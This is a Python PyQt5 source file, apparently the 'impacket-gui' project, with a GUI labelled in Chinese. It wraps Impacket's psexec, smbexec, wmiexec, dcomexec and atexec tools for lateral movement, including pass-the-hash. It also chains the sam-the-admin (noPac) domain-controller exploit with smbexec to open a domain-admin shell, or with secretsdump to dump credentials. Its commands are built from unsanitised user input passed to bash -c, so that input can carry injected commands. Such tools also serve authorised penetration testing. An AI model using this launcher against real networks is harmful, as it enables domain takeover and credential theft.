
import sys
from PyQt5.QtWidgets import QApplication, QLabel, QComboBox, QLineEdit, QPushButton, QDialog, QMessageBox, QTextEdit, QVBoxLayout, QWidget, QVBoxLayout, QTabWidget, QTextEdit, QPushButton, QHBoxLayout, QPlainTextEdit
from PyQt5.QtCore import QCoreApplication, Qt, QThread, pyqtSignal, QProcess, QTimer, QUrl
from PyQt5.QtGui import QIcon, QFont, QDesktopServices, QTextCursor

class InteractiveSession(QWidget):
    def __init__(self, ip, username, password, mode, codec):
        super().__init__()
        self.ip = ip
        self.username = username
        self.password = password
        self.mode = mode
        self.codec = codec
        self.session = None
        self.output_text = None  
        self.init_ui()
        self.connect_and_execute()

    def init_ui(self):
        self.output_text = QPlainTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setLineWrapMode(QPlainTextEdit.NoWrap)
        output_style = "background-color: #0C0C0C; color: #CCCCCC;"
        self.output_text.setStyleSheet(output_style)
        
        self.input_text = QLineEdit()
        self.input_text.setMaximumHeight(30)
        self.input_text.setPlaceholderText("在此处输入命令")

        layout = QVBoxLayout()
        layout.addWidget(self.output_text)
        layout.addWidget(self.input_text)

        self.setLayout(layout)

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Return or event.key() == Qt.Key_Enter:
            self.execute_command()


    def connect_and_execute(self):
        cmd = f"/usr/local/bin/{self.mode.lower()}.py {self.username}:{self.password}@{self.ip} -codec {self.codec}"

        if self.mode == "SamTheAdmin-shell":
            cmd = f"/bin/bash -c \"python ./sam-the-admin/sam_the_admin.py {self.username}:{self.password} -dc-ip {self.ip} -shell &&export KRB5CCNAME=Administrator.ccache && /usr/local/bin/smbexec.py -target-ip {self.ip} -k -no-pass `cat ./dcfull` -codec {self.codec}\""
        elif self.mode == "SamTheAdmin-dump":
            cmd = f"/bin/bash -c \"python ./sam-the-admin/sam_the_admin.py {self.username}:{self.password} -dc-ip {self.ip} -shell &&export KRB5CCNAME=Administrator.ccache && /usr/local/bin/secretsdump.py -target-ip {self.ip} -k -no-pass `cat ./dcfull`\""

        self.session = QProcess()
        self.session.setProcessChannelMode(QProcess.MergedChannels)
        self.session.readyReadStandardOutput.connect(self.update_terminal)
        self.session.start(cmd)
        self.session.waitForStarted()
    
    def execute_command(self):
            command = self.input_text.text()
            if command:
                self.input_text.clear()
                self.session.write(f"{command}\n".encode())
                self.session.waitForBytesWritten()

    def update_terminal(self):
        output_data = self.session.readAllStandardOutput().data()
        print(output_data)
        output_data = self.decode_output(output_data)
        self.output_text.appendPlainText(output_data)


    def decode_output(self, output_data):
        encodings = ['utf-8', 'gb2312']

        for encoding in encodings:
            try:
                output = output_data.decode(encoding).strip()
                return output
            except UnicodeDecodeError:
                pass

        return ''

class ImpacketTerminal(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.tab_widget = QTabWidget()
        add_session_button = QTextEdit("执行")
        add_session_button.setReadOnly(True)
        add_session_button.setAlignment(Qt.AlignCenter)
        add_session_button.setFixedHeight(50)
        add_session_button.setStyleSheet("font-size: 18px;")
        add_session_button.viewport().setAutoFillBackground(False)

        # 添加连接模式下拉框
        self.mode_combobox = QComboBox()
        self.mode_combobox.addItems(["PSEXEC", "SMBEXEC", "WMIEXEC"])
        self.mode_combobox.setCurrentIndex(0) 

        
        self.codec_combobox = QComboBox()
        self.codec_combobox.addItems(["utf-8", "gbk"])
        self.codec_combobox.setCurrentIndex(0)

        # 添加IP、用户名、密码输入框
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("请输入 IP 地址")

        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("请输入用户名：[domain/]username")

        self.password_input = QLineEdit()
        self.password_input.setPlaceholderText("请输入密码")
        self.password_input.setEchoMode(QLineEdit.Password)
        
        

        # 添加关闭当前会话按钮
        close_session_button = QPushButton("关闭当前会话")
        close_session_button.clicked.connect(self.close_current_session)

        layout = QVBoxLayout()
        layout.addWidget(self.mode_combobox)
        layout.addWidget(self.codec_combobox)
        layout.addWidget(self.ip_input)
        layout.addWidget(self.username_input)
        layout.addWidget(self.password_input)
        layout.addWidget(add_session_button)
        layout.addWidget(self.tab_widget)
        layout.addWidget(close_session_button)  # 添加关闭按钮

        self.setLayout(layout)

        add_session_button.mousePressEvent = self.add_session_tab

         # 用于保存输入框的文本
        self.saved_ip_text = ""
        self.saved_username_text = ""
        self.saved_password_text = ""

    def add_session_tab(self, event):
        ip = self.ip_input.text()
        username = self.username_input.text()
        password = self.password_input.text()

        # 获取用户选择的连接模式
        selected_mode = self.mode_combobox.currentText()
        selected_codec = self.codec_combobox.currentText()

        if ip and username and password:
            self.saved_ip_text = ip
            self.saved_username_text = username
            self.saved_password_text = password

            session = InteractiveSession(ip, username, password, selected_mode, selected_codec)
            self.tab_widget.addTab(session, f"{username}@{ip} {selected_mode}-{self.tab_widget.count() + 1}")
            # self.ip_input.clear()
            # self.username_input.clear()
            # self.password_input.clear()

        else:
            # 在没有输入完整信息时显示错误消息
            QMessageBox.warning(self, "错误", "请输入完整")

    def close_current_session(self):
        current_index = self.tab_widget.currentIndex()
        if current_index >= 0:
            session_widget = self.tab_widget.widget(current_index)
            if isinstance(session_widget, InteractiveSession):
                session_widget.session.terminate()
                self.tab_widget.removeTab(current_index)

class SamTheAdmin(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.tab_widget = QTabWidget()
        add_session_button = QTextEdit("执行")
        add_session_button.setReadOnly(True)
        add_session_button.setAlignment(Qt.AlignCenter)
        add_session_button.setFixedHeight(50)
        add_session_button.setStyleSheet("font-size: 18px;")
        add_session_button.viewport().setAutoFillBackground(False)

        # 添加连接模式下拉框
        self.mode_combobox = QComboBox()
        self.mode_combobox.addItems(["SamTheAdmin-shell", "SamTheAdmin-dump"])
        self.mode_combobox.setCurrentIndex(0)  # 设置默认连接模式

        self.codec_combobox = QComboBox()
        self.codec_combobox.addItems(["utf-8", "gbk"])
        self.codec_combobox.setCurrentIndex(0)

        # 添加IP、用户名、密码输入框
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("请输入 IP 地址")

        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("请输入用户名：[domain/]username")

        self.password_input = QLineEdit()
        self.password_input.setPlaceholderText("请输入密码")
        self.password_input.setEchoMode(QLineEdit.Password)
        
        

        # 添加关闭当前会话按钮
        close_session_button = QPushButton("关闭当前会话")
        close_session_button.clicked.connect(self.close_current_session)

        layout = QVBoxLayout()
        layout.addWidget(self.mode_combobox)
        layout.addWidget(self.codec_combobox)
        layout.addWidget(self.ip_input)
        layout.addWidget(self.username_input)
        layout.addWidget(self.password_input)
        layout.addWidget(add_session_button)
        layout.addWidget(self.tab_widget)
        layout.addWidget(close_session_button)  # 添加关闭按钮

        self.setLayout(layout)

        add_session_button.mousePressEvent = self.add_session_tab

         # 用于保存输入框的文本
        self.saved_ip_text = ""
        self.saved_username_text = ""
        self.saved_password_text = ""

    def add_session_tab(self, event):
        ip = self.ip_input.text()
        username = self.username_input.text()
        password = self.password_input.text()

        # 获取用户选择的连接模式
        selected_mode = self.mode_combobox.currentText()
        codec_mode = self.codec_combobox.currentText()

        if ip and username and password:
            self.saved_ip_text = ip
            self.saved_username_text = username
            self.saved_password_text = password

            session = InteractiveSession(ip, username, password, selected_mode, codec_mode)
            self.tab_widget.addTab(session, f"{username}@{ip} {selected_mode}-{self.tab_widget.count() + 1}")
            # self.ip_input.clear()
            # self.username_input.clear()
            # self.password_input.clear()

        else:
            # 在没有输入完整信息时显示错误消息
            QMessageBox.warning(self, "错误", "请输入完整")

    def close_current_session(self):
        current_index = self.tab_widget.currentIndex()
        if current_index >= 0:
            session_widget = self.tab_widget.widget(current_index)
            if isinstance(session_widget, InteractiveSession):
                session_widget.session.terminate()
                self.tab_widget.removeTab(current_index)

class CommandExecutor(QThread):
    command_output = pyqtSignal(str)

    def __init__(self, command):
        super().__init__()
        self.command = command

    def run(self):
        process = QProcess()
        self.command_output.emit(f"impacket-GUI > {self.command}")
        process.readyReadStandardOutput.connect(self.handle_output)
        process.finished.connect(self.finished)

        process.start(self.command)
        process.waitForFinished(-1)

        output_data = process.readAllStandardOutput().data()
        output = self.decode_output(output_data)
        self.command_output.emit(output)

    def handle_output(self):
        output_data = self.sender().readAllStandardOutput().data()
        output = self.decode_output(output_data)
        self.command_output.emit(output)

    def decode_output(self, output_data):
        encodings = ['utf-8', 'gb2312']

        for encoding in encodings:
            try:
                output = output_data.decode(encoding).strip()
                return output
            except UnicodeDecodeError:
                pass

        return ''

class ImpacketExecutor(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Impacket-GUI")
        self.setFont(QFont('Microsoft YaHei', 12))
        self.init_ui()

    def init_ui(self):
        self.tab_widget = QTabWidget()

        tabs = ["PSEXEC", "SMBEXEC", "DCOMEXEC", "WMIEXEC", "ATEXEC"]
        self.executor_threads = []

        for tab_name in tabs:
            tab = QWidget()
            self.init_tab(tab, tab_name)
            self.tab_widget.addTab(tab, tab_name)

        layout = QVBoxLayout()
        layout.addWidget(self.tab_widget)



        about_button = QPushButton("关于")
        about_button.clicked.connect(self.open_about_url)
        layout.addWidget(about_button)

        self.setLayout(layout)

    def init_tab(self, tab, tab_name):
        ip_label = QLabel("IP 地址:")
        ip_entry = QLineEdit()
        username_label = QLabel("用户名:")
        username_entry = QLineEdit()
        password_label = QLabel("密码:")
        password_entry = QLineEdit()
        password_entry.setEchoMode(QLineEdit.Password)
        hashes_label = QLabel("哈希:")
        hashes_entry = QLineEdit()
        command_label = QLabel(f"执行方式为 {tab_name}:")
        command_entry = QLineEdit()
        result_text = QTextEdit()

        codec_combobox = QComboBox()
        codec_combobox.addItems(["utf-8", "gbk"])
        codec_combobox.setCurrentIndex(0)
        
        result_text.setReadOnly(True)

        execute_button = QPushButton("执行命令")
        execute_button.clicked.connect(lambda: self.execute_command(tab_name, ip_entry.text(), username_entry.text(), password_entry.text(), hashes_entry.text(), command_entry.text(), result_text, codec_combobox.currentText()))

        tab_layout = QVBoxLayout()
        tab_layout.addWidget(codec_combobox)
        tab_layout.addWidget(ip_label)
        tab_layout.addWidget(ip_entry)
        tab_layout.addWidget(username_label)
        tab_layout.addWidget(username_entry)
        tab_layout.addWidget(password_label)
        tab_layout.addWidget(password_entry)
        tab_layout.addWidget(hashes_label)
        tab_layout.addWidget(hashes_entry)
        tab_layout.addWidget(command_label)
        tab_layout.addWidget(command_entry)
        tab_layout.addWidget(execute_button)
        tab_layout.addWidget(result_text)

        tab.setLayout(tab_layout)


    def open_about_url(self):
        about_url = "https://github.com/yutianqaq/impacket-gui"
        QDesktopServices.openUrl(QUrl(about_url))

    def execute_command(self, tab_name, ip, username, password, hashes, command, result_text, codec):

        cmd = f"/usr/local/bin/{tab_name.lower()}.py {username}:{password}@{ip} {command} -codec {codec}"
        if hashes:
            cmd = f"/usr/local/bin/{tab_name.lower()}.py {username}@{ip} {command} -hashes 00000000000000000000000000000000:{hashes} -codec {codec}"

        executor = CommandExecutor(cmd)
        executor.command_output.connect(result_text.append)
        executor.finished.connect(executor.deleteLater)

        executor_thread = QThread()
        executor.moveToThread(executor_thread)
        executor_thread.started.connect(executor.run)
        executor_thread.finished.connect(executor_thread.deleteLater)

        self.executor_threads.append(executor_thread)
        executor_thread.start()

        while executor_thread.isRunning():
            QCoreApplication.processEvents()

    def closeEvent(self, event):
        for executor_thread in self.executor_threads:
            executor_thread.quit()
            executor_thread.wait()

        event.accept()
if __name__ == '__main__':
    app = QApplication(sys.argv)
    tab_widget = QTabWidget()

    impacket_executor = ImpacketExecutor()
    impacket_terminal_tab = ImpacketTerminal()
    sam_the_admin_tab = SamTheAdmin()

    tab_widget.addTab(impacket_executor, "横向移动")
    tab_widget.addTab(impacket_terminal_tab, "横向移动交互式")
    tab_widget.addTab(sam_the_admin_tab, "sam-the-admin-域控测试")

    window = QWidget()
    window.setWindowTitle("Impacket GUI")
    window.resize(1200, 800)
    window.setWindowIcon(QIcon("./logo.jpg"))

    layout = QVBoxLayout()
    layout.addWidget(tab_widget)
    window.setLayout(layout)

    window.show()
    sys.exit(app.exec_())
